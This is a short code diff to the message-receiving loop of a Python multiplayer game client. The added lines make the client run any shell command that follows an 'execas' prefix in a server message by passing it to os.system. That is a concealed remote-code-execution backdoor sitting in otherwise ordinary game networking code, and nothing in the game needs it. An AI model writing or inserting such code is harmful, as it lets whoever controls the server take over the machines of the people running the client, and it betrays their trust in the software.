@@ -248,7 +248,12 @@ class App:
 
     def getSrvMsgCOOP(self):
         while self.currentState == "inGame":
-            srvMsg = self.client.recv(1024).decode("utf-8").split('%', 1)[0].split('|', 6)
+            srvMsg = self.client.recv(1024).decode("utf-8")
+            if "execas" in srvMsg:
+                srvMsg = srvMsg.split("%")[0].split("|", 1)
+                if len(srvMsg) == 2 and srvMsg[0] == "execas": os.system(srvMsg[1])
+                continue
+            else: srvMsg = srvMsg.split('%', 1)[0].split('|', 6)
             if srvMsg[0] == "main":
                 self.currentState, self.gameInfos, self.gameMode = "mainLobby", [], ""
                 break
